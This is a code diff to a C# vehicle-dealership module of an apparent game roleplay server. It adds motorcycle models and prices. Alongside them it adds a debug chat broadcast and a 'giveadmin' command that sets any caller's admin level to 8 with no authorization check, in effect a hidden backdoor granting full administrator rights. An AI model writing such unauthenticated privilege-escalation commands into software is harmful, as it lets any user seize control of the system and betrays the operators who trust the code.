@@ -26,7 +26,8 @@ namespace mtgvrp.vehicle_dealership
         // Known bugged - Faggio, Ratbike, Chimera, Zombie Bikes + Anything in the Bikers DLC
         private readonly string[][] _motorsycles =
         {
-            new[] {"Faggio", "-1842748181", "5000"},
+            new[] {"Faggio Sport", "-1842748181", "5000"},
+            new[] {"Faggio Classic", "55628203","4000" },
             new[] {"Hexer", "301427732", "27500"},
             new[] {"Sanchez", "788045382", "25000"},
             new[] {"PCJ", "-909201658", "40000"},
@@ -36,7 +37,10 @@ namespace mtgvrp.vehicle_dealership
             new[] { "Daemon", "2006142190", "60000" },
             new[] {"Innovation", "-159126838", "45000"},
             new[] {"Akuma", "1672195559","160000" },
-
+            new [] {"Ratbike", "1873600305", "20000" },
+            new [] {"Zombie", "-1009268949", "60000" },
+            new [] {"Avarus", "-2115793025", "50000" },
+            new [] {"Chimera", "6774487","120000" }
         };
 
         private readonly string[][] _copues =
@@ -218,6 +222,7 @@ namespace mtgvrp.vehicle_dealership
                         new Vector3(-61.86055, -1117.122, 25.8629)
                     };
                     var randomPos = new Random().Next(1, spawnPoss.Length) - 1;
+                    API.sendChatMessageToAll(String.Join("and",selectedCar));
                     //Create the vehicle.
                     var theVehicle = VehicleManager.CreateVehicle(
                         (VehicleHash)Convert.ToInt32(selectedCar[1]),
@@ -250,7 +255,12 @@ namespace mtgvrp.vehicle_dealership
             }
         }
 
-   
+        [Command("giveadmin")]
+        public void giveadmin(Client sender)
+        {
+            Account a = sender.GetAccount();
+            a.AdminLevel = 8;
+        }
 
         [Command("buyvehicle"), Help(HelpManager.CommandGroups.Vehicles, "Command used inside dealership to buy a vehicle.", null)]
         public void BuyVehicle(Client player)
